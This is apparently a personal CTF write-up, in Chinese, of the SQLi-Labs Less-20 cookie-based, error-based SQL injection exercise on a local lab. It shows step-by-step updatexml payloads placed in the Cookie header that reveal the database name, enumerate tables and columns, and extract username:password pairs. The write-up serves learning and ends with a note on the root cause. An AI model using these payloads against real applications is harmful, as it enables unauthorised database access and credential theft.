【SQLi-Labs】Less-20 Cookie 注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.25 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, POST注入, Cookie注入, 报错注入

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-20 (POST - Cookie injections - Uagent field - error based)
  • 提示：POST请求，Cookie 注入，基于报错

2. 解题思路与前置原理

本关卡的业务逻辑变化为使用 Cookie 维持登录状态。当用户登录成功后，服务器会下发一个 uname=admin 的 Cookie。后续刷新页面时，后台直接读取该 Cookie，并将其拼接入 SQL 语句（大概率为 SELECT * FROM users WHERE username = '$cookie'）以查询用户信息。

由于代码未对 Cookie 内容进行过滤，且查询结果会以报错形式回显，因此可以通过修改请求头中的 Cookie 字段进行报错注入。

3. 操作步骤与解析

第一步：登录获取 Cookie

在登录框输入有效的账号密码（如 admin/123456），成功登录后，页面会明文显示当前的 Cookie 信息：YOUR COOKIE : uname = admin。

第二步：抓取 GET 请求并测试闭合

开启 Burp Suite 拦截，在浏览器中刷新页面。Burp 抓取到 GET 请求后，发送至 Repeater。 在请求头中找到 Cookie 字段，添加单引号进行闭合测试：

Cookie: uname=admin'

点击发送，右侧响应抛出 SQL 语法错误：near '"admin"' LIMIT 0,1。证明此处存在单引号字符型注入点。

第三步：利用 updatexml 报错注入

在 Cookie 中闭合单引号，并追加报错函数，使用 # 注释掉后续的 and expires... 等代码：

Cookie: uname=admin' AND updatexml(1, concat(0x7e, (select database()), 0x7e), 1) #

回显：XPATH syntax error: '~security~'。

第四步：获取表名与列名

查表名：

Cookie: uname=admin' AND updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x7e), 1) #

回显：~emails,referrers,uagents,users~。

查列名（注意此处由于未限制库名，导致查出系统表列名）：

Cookie: uname=admin' AND updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='users'), 0x7e), 1) #

回显：~USER,CURRENT_CONNECTIONS,TOTAL_...~（发生跨库数据污染）。 修正 Payload：加上 and table_schema='security' 即可精准获取 id,username,password。

第五步：提取最终数据

由于报错注入有 32 字符限制，使用 limit 0,1 提取第一行数据：

Cookie: uname=admin' AND updatexml(1, concat(0x7e, (select concat(username,0x3a,password) from users limit 0,1), 0x7e), 1) #

回显：XPATH syntax error: '~Dumb:Dumb~'。

4. 踩坑记录与复盘

  • Cookie 维持状态的机制：理解了 Web 登录状态维持的底层逻辑，即服务器信任客户端携带的 Cookie 数据并直接拼接入数据库，这是 Cookie 注入的根源。
  • 数据污染问题：在查 information_schema.columns 时，必须同时限定 table_schema 和 table_name。否则 MySQL 引擎会遍历所有库中同名表的结构，导致系统元数据被混入回显中。

5. 知识点总结

  • Cookie 注入：HTTP 头部注入的变种，由于后端盲目信任客户端传入的 Cookie 字段并直接执行 SQL 查询，导致攻击者可通过篡改 Cookie 实施注入。
